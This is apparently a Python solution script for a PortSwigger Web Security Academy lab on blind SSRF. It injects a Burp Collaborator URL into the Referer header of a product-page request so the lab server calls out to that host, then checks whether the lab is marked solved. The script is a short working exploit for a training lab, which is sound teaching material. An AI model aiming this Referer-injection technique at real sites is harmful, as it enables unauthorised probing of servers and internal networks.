import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection
# author: 0xyf


class SSRF3:
    def __init__(self):
        self.lab_id = "0ad3004c030cb1ca82ea15cc000200f9"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.vuln_url = f"{self.url}/product?productId=1"
        self.collab_url = "http://tqn4b3okz3zqzrtxtihoolyvtmzindp1e.oastify.com"

    def ssrf(self):
        headers = {"Referer": self.collab_url}
        r = requests.get(
            self.vuln_url,
            headers=headers,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def check_solved(self):
        sleep(5)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.ssrf()
        self.check_solved()


def main():
    SSRF3().solve()


if __name__ == "__main__":
    main()
